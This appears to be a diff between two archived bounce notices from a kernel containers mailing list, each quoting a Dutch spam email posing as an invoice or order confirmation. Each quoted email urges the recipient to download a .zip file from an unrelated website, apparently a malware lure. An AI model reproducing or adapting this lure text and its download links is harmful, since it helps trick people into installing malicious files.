@@ -1,7 +1,7 @@
-From: Mail Delivery System <Mailer-Daemon-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
-Subject: Mail delivery failed: returning message to sender
-Date: Tue, 15 Nov 2011 11:51:37 +0000
-Message-ID: <E1RQHY9-0003oO-9A@uspro545.startdedicated.com>
+From: MAILER-DAEMON-wypAv8xQ7Oq0YzD1I/+uVA@public.gmane.org
+Subject: failure notice
+Date: 15 Nov 2011 12:53:10 +0100
+Message-ID: <20111115115837.02E723F6@mail.linuxfoundation.org>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -18,30 +18,33 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This message was created automatically by mail delivery software.
+Hi. This is the qmail-send program at mx1.1partner.nl.
+I'm afraid I wasn't able to deliver your message to the following addresses.
+This is a permanent error; I've given up. Sorry it didn't work out.
 
-A message that you sent could not be delivered to one or more of its
-recipients. This is a permanent error. The following address(es) failed:
+<spam-wypAv8xQ7Oq0YzD1I/+uVA@public.gmane.org>:
+Sorry, no mailbox here by that name. (#5.1.1)
 
-  coccunning-fEVHNqx5roCL3h7OUvcu3w@public.gmane.org
-    The mail server could not deliver mail to coccunning-fEVHNqx5roCL3h7OUvcu3+G/Ez6ZCGd0@public.gmane.org  The account or domain may not exist, they may be blacklisted, or missing the proper dns entries.
+--- Below this line is a copy of the message.
 
------- This is a copy of the message, including all the headers. ------
-
-Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from localhost ([127.0.0.1] helo=uspro545.startdedicated.com)
-	by uspro545.startdedicated.com with esmtp (Exim 4.69)
-	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
-	id 1RQHY9-0003oM-5A
-	for coccunning-fEVHNqx5roCL3h7OUvcu3w@public.gmane.org; Tue, 15 Nov 2011 11:51:37 +0000
-Received: from [173.224.125.98] by uspro545.startdedicated.com id 5hOFOJ3CmxZd with SMTP; Tue, 15 Nov 2011 11:51:36 +0000
-Date: Tue, 15 Nov 2011 11:51:36 +0000
-From: "Consult Group" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v4.4.51.1) Educational
-X-Priority: 3 (Normal)
-Message-ID: <54213065.26533967279065-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
-To: <coccunning-fEVHNqx5roCL3h7OUvcu3w@public.gmane.org>
-Subject: Factuur - 730240-929335
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: (qmail 3635 invoked by uid 509); 15 Nov 2011 12:53:10 +0100
+Received: from 173.224.125.98 by 1Partner-S002.1partner.nl (envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>, uid 507) with qmail-scanner-1.25-st-qms 
+ (clamdscan: 0.96.4/12335. spamassassin: 3.3.1. perlscan: 1.25-st-qms.  
+ Clear:RC:0(173.224.125.98):SA:1(6.1/5.0):. 
+ Processed in 3.106603 secs); 15 Nov 2011 11:53:10 -0000
+X-Spam-Status: Yes, hits=6.1 required=5.0
+X-Spam-Level: ++++++
+X-Antivirus-MYDOMAIN-Mail-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org via 1Partner-S002.1partner.nl
+X-Antivirus-MYDOMAIN: 1.25-st-qms (Clear:RC:0(173.224.125.98):SA:1(6.1/5.0):. Processed in 3.106603 secs Process 3594)
+Received: from uspro545.startdedicated.com (173.224.125.98)
+  by mx1.1partner.nl with SMTP; 15 Nov 2011 12:53:07 +0100
+Received: from [173.224.125.98] by uspro545.startdedicated.com id TRa5NRhc5HVM; Tue, 15 Nov 2011 11:53:08 +0000
+Message-ID: <001f01cca38d$2302bd00$0500a8c0-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
+From: "Info" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <coffmanastigmatism-Uuzfw2ab6QY@public.gmane.org>
+Subject: :SPAM: Factuur 370194-298405
+Date: Tue, 15 Nov 2011 11:53:08 +0000
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
@@ -49,9 +52,17 @@ Content-Transfer-Encoding: 8bit
 
 
 
-Werk uw accountgegevens.
-http://damianofrutta.it/clientedown/Order.zip?id:84828Generation_user=coccunning-fEVHNqx5roCL3h7OUvcu3w@public.gmane.org
 
-____________
-Best regards, 
-ticket service.
+Hello, 
+
+Uw bestelling is geaccepteerd.
+
+Uw bestelling referentie is 056493.
+
+Leveringsvoorwaarden en de datum kan worden gevonden met de automatisch gegenereerde 
+PDF-order te vinden op:
+http://coronelservices.com/clientedown/Invoice.zip?id:654Generation_user=coffmanastigmatism-Uuzfw2ab6QY@public.gmane.org
+
+____________________________
+Best regards, ticket service.
+Tel./Fax.: +31 (40) 638-19-03              
